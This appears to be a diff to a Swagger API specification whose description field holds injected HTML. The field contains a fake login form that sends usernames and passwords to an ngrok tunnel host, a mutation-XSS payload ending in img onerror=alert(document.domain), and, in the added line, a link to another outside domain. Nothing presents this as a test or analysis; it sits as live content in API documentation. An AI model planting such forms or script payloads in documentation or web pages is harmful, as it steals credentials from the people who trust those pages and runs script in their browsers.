@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    Hi, im Joey<br><table><tr><td><img src=''><br>Please login here to continue</a></td><td><div class="heading"><h1>Login</h1></div>  <div class="container"><form action=https://1501-103-139-220-71.ngrok.io>Username:<br><input type="username" name="username"></br>Password:<br>
+    Hi, im Joey<br><table><tr><td><img src=''><a href='https://mzl0y1cm.x1.pe/'><br>Please login here to continue</a></td><td><div class="heading"><h1>Login</h1></div>  <div class="container"><form action=https://1501-103-139-220-71.ngrok.io>Username:<br><input type="username" name="username"></br>Password:<br>
     <input type="password" name="password"></br><br><input type="submit" value="Logon"></br></div></td></tr></table><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
   version: production
